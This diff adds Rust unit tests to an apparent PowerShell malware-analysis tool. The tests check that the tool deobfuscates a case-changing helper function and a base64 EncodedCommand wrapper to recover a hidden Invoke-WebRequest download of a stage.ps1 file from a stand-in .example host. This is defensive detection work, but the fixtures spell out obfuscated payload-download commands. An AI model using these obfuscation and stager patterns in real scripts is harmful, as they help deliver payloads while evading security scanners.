@@ -15935,6 +15935,35 @@ Invoke-Expression $cmd"#,
     }
 
     #[test]
+    fn ps1_literal_string_case_extractor_call_recovers_nested_command() {
+        use base64::Engine;
+
+        let decoded = "invoke-webrequest -uri https://ps-lower-extractor.example/stage.ps1";
+        let inner = r#"function Lower($value) {
+  return $value.ToLower()
+}
+Lower 'INVOKE-WEBREQUEST -URI HTTPS://PS-LOWER-EXTRACTOR.EXAMPLE/STAGE.PS1'"#;
+        let b64 = base64::engine::general_purpose::STANDARD.encode(
+            inner
+                .encode_utf16()
+                .flat_map(|c| c.to_le_bytes())
+                .collect::<Vec<_>>(),
+        );
+        let script = format!("powershell -EncodedCommand {}\r\n", b64);
+        let report = analyze(script.as_bytes(), &Config::default());
+        let has = report.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, .. } if src == "https://ps-lower-extractor.example/stage.ps1"
+            )
+        });
+        assert!(
+            has,
+            "literal string-case extractor call was not recursively decoded from {decoded}: {:?}\n{}",
+            report.traits, report.deobfuscated
+        );
+    }
+
+    #[test]
     fn ps1_normalization_decodes_literal_tail_substring_extractor_call() {
         let decoded =
             "Invoke-WebRequest -Uri https://ps-tail-substring-extractor.example/stage.ps1";
@@ -16002,6 +16031,22 @@ Add 'InvokeWebRequest -Uri https://ps-insert-extractor.example/stage.ps1' 6 '-'"
         assert!(
             normalized.contains(&format!("'{decoded}'")),
             "literal insert extractor call was not normalized:\n{}",
+            normalized
+        );
+    }
+
+    #[test]
+    fn ps1_normalization_decodes_literal_string_case_extractor_call() {
+        let ps = r#"function Lower($value) {
+  return $value.ToLower()
+}
+Lower 'INVOKE-WEBREQUEST -URI HTTPS://PS-LOWER-EXTRACTOR.EXAMPLE/STAGE.PS1'"#;
+        let normalized = crate::ps1_scan::normalize_ps1_text(ps);
+
+        assert!(
+            normalized
+                .contains("'invoke-webrequest -uri https://ps-lower-extractor.example/stage.ps1'"),
+            "literal string-case extractor call was not normalized:\n{}",
             normalized
         );
     }
